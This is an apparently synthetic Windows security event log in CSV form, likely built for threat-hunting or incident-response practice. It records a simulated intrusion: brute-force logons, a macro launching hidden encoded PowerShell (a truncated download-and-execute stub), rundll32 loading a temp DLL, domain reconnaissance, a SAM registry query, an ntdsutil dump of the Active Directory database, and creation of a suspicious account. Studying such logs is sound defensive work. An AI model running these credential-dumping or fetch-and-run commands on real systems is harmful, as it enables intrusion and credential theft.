TimeGenerated,EventID,Activity,Computer,Account,TargetAccount,TargetUserName,SubjectUserName,LogonType,IpAddress,Status,SubStatus,NewProcessName,ParentProcessName,CommandLine,PrivilegeList,TargetUserSid,Correlation
2026-06-10T08:34:55Z,4625,4625 - An account failed to log on,FIN-WS-07,CONTOSO\alexw,CONTOSO\alexw,alexw,-,3,185.220.101.2,0xC000006D,0xC000006A,,,,,S-1-5-21-1111111111-2222222222-3333333333-1107,a0000000-0000-0000-0000-0000000000a1
2026-06-10T08:35:02Z,4625,4625 - An account failed to log on,FIN-WS-07,CONTOSO\alexw,CONTOSO\alexw,alexw,-,3,185.220.101.2,0xC000006D,0xC000006A,,,,,S-1-5-21-1111111111-2222222222-3333333333-1107,a0000000-0000-0000-0000-0000000000a2
2026-06-10T08:35:09Z,4625,4625 - An account failed to log on,FIN-WS-07,CONTOSO\alexw,CONTOSO\alexw,alexw,-,3,185.220.101.2,0xC000006D,0xC000006A,,,,,S-1-5-21-1111111111-2222222222-3333333333-1107,a0000000-0000-0000-0000-0000000000a3
2026-06-10T08:35:16Z,4625,4625 - An account failed to log on,FIN-WS-07,CONTOSO\alexw,CONTOSO\alexw,alexw,-,3,185.220.101.2,0xC000006D,0xC000006A,,,,,S-1-5-21-1111111111-2222222222-3333333333-1107,a0000000-0000-0000-0000-0000000000a4
2026-06-10T08:35:24Z,4625,4625 - An account failed to log on,FIN-WS-07,CONTOSO\alexw,CONTOSO\alexw,alexw,-,3,185.220.101.2,0xC000006D,0xC000006A,,,,,S-1-5-21-1111111111-2222222222-3333333333-1107,a0000000-0000-0000-0000-0000000000a5
2026-06-10T08:36:01Z,4625,4625 - An account failed to log on,FIN-WS-07,CONTOSO\svc-backup,CONTOSO\svc-backup,svc-backup,-,3,185.220.101.2,0xC000006D,0xC0000064,,,,,S-1-5-21-1111111111-2222222222-3333333333-1180,a0000000-0000-0000-0000-0000000000a6
2026-06-10T08:36:44Z,4624,4624 - An account was successfully logged on,FIN-WS-07,CONTOSO\alexw,CONTOSO\alexw,alexw,-,3,185.220.101.2,0x0,0x0,,,,,S-1-5-21-1111111111-2222222222-3333333333-1107,a0000000-0000-0000-0000-0000000000a7
2026-06-10T08:40:12Z,4624,4624 - An account was successfully logged on,FIN-WS-07,CONTOSO\meganb,CONTOSO\meganb,meganb,-,2,,0x0,0x0,,,,,S-1-5-21-1111111111-2222222222-3333333333-1142,b0000000-0000-0000-0000-0000000000b1
2026-06-10T08:42:33Z,4624,4624 - An account was successfully logged on,HR-WS-03,CONTOSO\jamest,CONTOSO\jamest,jamest,-,2,,0x0,0x0,,,,,S-1-5-21-1111111111-2222222222-3333333333-1155,b0000000-0000-0000-0000-0000000000b2
2026-06-10T08:51:07Z,4624,4624 - An account was successfully logged on,FIN-WS-07,CONTOSO\alexw,CONTOSO\alexw,alexw,-,10,185.220.101.2,0x0,0x0,,,,,S-1-5-21-1111111111-2222222222-3333333333-1107,a0000000-0000-0000-0000-0000000000a8
2026-06-10T08:58:41Z,4688,4688 - A new process has been created,FIN-WS-07,CONTOSO\alexw,,alexw,,,,0x0,0x0,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n ""C:\Users\alexw\Downloads\Invoice_Q2.docm""",,S-1-5-21-1111111111-2222222222-3333333333-1107,a0000000-0000-0000-0000-0000000000a9
2026-06-10T09:00:18Z,4688,4688 - A new process has been created,FIN-WS-07,CONTOSO\alexw,,alexw,,,,0x0,0x0,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,WINWORD.EXE,"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",,S-1-5-21-1111111111-2222222222-3333333333-1107,a0000000-0000-0000-0000-0000000000aa
2026-06-10T09:00:52Z,4688,4688 - A new process has been created,FIN-WS-07,CONTOSO\alexw,,alexw,,,,0x0,0x0,C:\Windows\System32\rundll32.exe,powershell.exe,"rundll32.exe C:\Users\alexw\AppData\Local\Temp\update.dll,StartW",,S-1-5-21-1111111111-2222222222-3333333333-1107,a0000000-0000-0000-0000-0000000000ab
2026-06-10T09:01:30Z,4688,4688 - A new process has been created,FIN-WS-07,CONTOSO\alexw,,alexw,,,,0x0,0x0,C:\Windows\System32\whoami.exe,powershell.exe,whoami /all,,S-1-5-21-1111111111-2222222222-3333333333-1107,a0000000-0000-0000-0000-0000000000ac
2026-06-10T09:02:14Z,4688,4688 - A new process has been created,FIN-WS-07,CONTOSO\alexw,,alexw,,,,0x0,0x0,C:\Windows\System32\net.exe,powershell.exe,"net group ""Domain Admins"" /domain",,S-1-5-21-1111111111-2222222222-3333333333-1107,a0000000-0000-0000-0000-0000000000ad
2026-06-10T09:03:05Z,4672,4672 - Special privileges assigned to new logon,FIN-WS-07,CONTOSO\alexw,CONTOSO\alexw,alexw,alexw,,,0x0,0x0,,,,SeDebugPrivilege SeTcbPrivilege SeImpersonatePrivilege,S-1-5-21-1111111111-2222222222-3333333333-1107,a0000000-0000-0000-0000-0000000000ae
2026-06-10T09:05:22Z,4688,4688 - A new process has been created,FIN-WS-07,CONTOSO\meganb,,meganb,,,,0x0,0x0,C:\Program Files\Google\Chrome\Application\chrome.exe,explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",,S-1-5-21-1111111111-2222222222-3333333333-1142,b0000000-0000-0000-0000-0000000000b3
2026-06-10T09:08:47Z,4624,4624 - An account was successfully logged on,DC01,CONTOSO\alexw,CONTOSO\alexw,alexw,-,3,FIN-WS-07,0x0,0x0,,,,,S-1-5-21-1111111111-2222222222-3333333333-1107,a0000000-0000-0000-0000-0000000000af
2026-06-10T09:09:33Z,4672,4672 - Special privileges assigned to new logon,DC01,CONTOSO\alexw,CONTOSO\alexw,alexw,alexw,,,0x0,0x0,,,,SeDebugPrivilege SeBackupPrivilege SeSecurityPrivilege,S-1-5-21-1111111111-2222222222-3333333333-1107,a0000000-0000-0000-0000-0000000000b0
2026-06-10T09:10:05Z,4688,4688 - A new process has been created,DC01,CONTOSO\alexw,,alexw,,,,0x0,0x0,C:\Windows\System32\cmd.exe,wmiprvse.exe,"cmd.exe /c ""reg query HKLM\SAM""",,S-1-5-21-1111111111-2222222222-3333333333-1107,a0000000-0000-0000-0000-000000000b01
2026-06-10T09:11:48Z,4688,4688 - A new process has been created,DC01,CONTOSO\alexw,,alexw,,,,0x0,0x0,C:\Windows\System32\ntdsutil.exe,cmd.exe,"ntdsutil.exe ""ac i ntds"" ""ifm"" ""create full C:\Windows\Temp\ifm"" q q",,S-1-5-21-1111111111-2222222222-3333333333-1107,a0000000-0000-0000-0000-000000000b02
2026-06-10T09:14:09Z,4624,4624 - An account was successfully logged on,FIN-WS-07,CONTOSO\meganb,CONTOSO\meganb,meganb,-,7,,0x0,0x0,,,,,S-1-5-21-1111111111-2222222222-3333333333-1142,b0000000-0000-0000-0000-0000000000b4
2026-06-10T09:18:55Z,4624,4624 - An account was successfully logged on,FIN-WS-07,CONTOSO\itadmin,CONTOSO\itadmin,itadmin,-,10,52.170.12.45,0x0,0x0,,,,,S-1-5-21-1111111111-2222222222-3333333333-1050,c0000000-0000-0000-0000-0000000000c1
2026-06-10T09:22:31Z,4624,4624 - An account was successfully logged on,DC01,CONTOSO\dvora,CONTOSO\dvora,dvora,-,3,20.98.111.30,0x0,0x0,,,,,S-1-5-21-1111111111-2222222222-3333333333-1051,c0000000-0000-0000-0000-0000000000c2
2026-06-10T09:25:14Z,4625,4625 - An account failed to log on,DC01,CONTOSO\administrator,CONTOSO\administrator,administrator,-,3,185.220.101.2,0xC000006D,0xC000006A,,,,,S-1-5-21-1111111111-2222222222-3333333333-500,a0000000-0000-0000-0000-000000000b03
2026-06-10T09:31:40Z,4720,4720 - A user account was created,DC01,CONTOSO\alexw,CONTOSO\svc-helpdesk,svc-helpdesk,alexw,,,0x0,0x0,,,,,S-1-5-21-1111111111-2222222222-3333333333-1201,a0000000-0000-0000-0000-000000000b04
